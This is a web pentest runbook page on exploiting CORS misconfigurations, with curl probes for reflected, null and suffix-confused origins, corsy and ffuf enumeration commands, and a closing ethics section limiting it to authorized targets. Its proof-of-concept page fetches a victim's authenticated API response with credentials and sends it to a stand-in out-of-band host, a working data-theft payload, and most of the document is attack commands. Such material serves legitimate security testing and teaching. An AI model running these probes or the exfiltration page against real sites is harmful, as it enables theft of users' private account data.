---
title: "CORS Misconfigurations & Bypass"
description: "Exploiting permissive CORS: reflected and null origins, wildcard with credentials, subdomain trust, and reading authenticated responses."
phase: Web
order: 23
tags:
  - cors
  - web
  - browser-security
  - misconfiguration
tools:
  - burp suite
  - curl
updated: 2026-10-01
---

A CORS testing runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: find an endpoint that reflects an attacker origin (or trusts `null`) while allowing credentials, then prove an attacker page can read authenticated data.

## 1. Baseline the CORS headers

```bash
# Send an Origin and inspect the reflected headers
curl -s -D - -o /dev/null -H "Origin: https://evil.example" "https://target.com/api/me"

# Same request, no Origin, as a control
curl -s -D - -o /dev/null "https://target.com/api/me"
```

Capture `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC).

## 2. Test arbitrary origin reflection

```bash
# Reflected origin + credentials is the dangerous combination
curl -s -D - -o /dev/null -H "Origin: https://evil.example" "https://target.com/api/me" \
  | grep -i "access-control-allow"

# Confirm the body differs when authenticated vs not
curl -s -H "Origin: https://evil.example" -b "session=YOURTOKEN" "https://target.com/api/me"
```

## 3. Probe null origin

`null` is sent by sandboxed iframes and `data:` URLs, so trusting it is exploitable.

```bash
curl -s -D - -o /dev/null -H "Origin: null" "https://target.com/api/me" \
  | grep -i "access-control-allow"

# Exploit shape: <iframe sandbox srcdoc="<script fetch with credentials>"></iframe>
```

## 4. Subdomain and prefix trust

Apps often trust `*.target.com` but check with a naive `endsWith`, letting `target.com.evil.example` or a compromised subdomain through.

```bash
# Prefix/suffix confusion
curl -s -D - -o /dev/null -H "Origin: https://target.com.evil.example" "https://target.com/api/me" \
  | grep -i "access-control-allow"

# Takeover-driven trust (if a subdomain is dangling)
curl -s -D - -o /dev/null -H "Origin: https://gone.target.com" "https://target.com/api/me" \
  | grep -i "access-control-allow"
```

## 5. Enumerate with corsy

```bash
corsy -u https://target.com/api/me -t 20
corsy -i urls.txt -t 20 -o cors.txt
```

## 6. Enumerate endpoints worth testing

```bash
# Find API endpoints with auth-relevant paths
ffuf -u "https://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,401,403 -t 30 -o endpoints.txt
```

## 7. Build the proof-of-concept page

```bash
# Host this and confirm the browser returns victim data to your listener
cat > cors_poc.html <<'EOF'
<script>
fetch('https://target.com/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://oob.example/cb?d=' + encodeURIComponent(d)));
</script>
EOF
python3 -m http.server 8000
```

## Full pipeline

```bash
# 1. Baseline vs attacker origin
curl -s -D - -o /dev/null "https://target.com/api/me"
curl -s -D - -o /dev/null -H "Origin: https://evil.example" "https://target.com/api/me" | grep -i "access-control-allow"

# 2. Dangerous combinations
curl -s -D - -o /dev/null -H "Origin: null" "https://target.com/api/me" | grep -i "access-control-allow"
curl -s -D - -o /dev/null -H "Origin: https://target.com.evil.example" "https://target.com/api/me" | grep -i "access-control-allow"

# 3. Automated sweep
ffuf -u "https://target.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,401,403 -t 30 -o endpoints.txt
corsy -i endpoints.txt -t 20 -o cors.txt

# 4. Proof page
python3 -m http.server 8000
```

## Ethics & legality

- Only test endpoints within the authorized scope, using accounts you own.
- Use a neutral PoC page that reads data once; do not harvest or store real user data.
- Confirm reflection with low request volume to avoid tripping WAFs.
- Save the exact Origin header, response headers, and body as evidence.
